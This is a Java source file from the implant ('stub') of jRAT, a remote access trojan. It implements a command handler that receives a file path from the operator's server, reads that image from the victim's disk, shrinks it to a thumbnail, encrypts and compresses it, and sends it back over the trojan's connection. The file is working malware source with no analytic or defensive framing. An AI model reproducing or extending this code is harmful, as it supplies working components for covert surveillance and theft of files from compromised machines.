package se.jrat.stub.packets.incoming;

import java.awt.image.BufferedImage;
import java.io.File;

import javax.imageio.ImageIO;

import se.jrat.common.compress.GZip;
import se.jrat.common.crypto.Crypto;
import se.jrat.stub.Connection;
import se.jrat.stub.Main;
import se.jrat.stub.packets.outgoing.Packet59ThumbnailPreview;
import se.jrat.stub.utils.ImageUtils;


public class Packet85ThumbnailPreview extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String file = Connection.readLine();

		Connection.addToSendQueue(new Packet59ThumbnailPreview(file));

		BufferedImage screenShot = ImageIO.read(new File(file));
		screenShot = ImageUtils.resize(screenShot, 150, 100);
		byte[] buffer = ImageUtils.encode(screenShot);
		buffer = GZip.compress(Crypto.encrypt(buffer, Main.getKey()));
		Connection.dos.writeInt(buffer.length);
		Connection.dos.write(buffer);

		Connection.lock();
	}

}
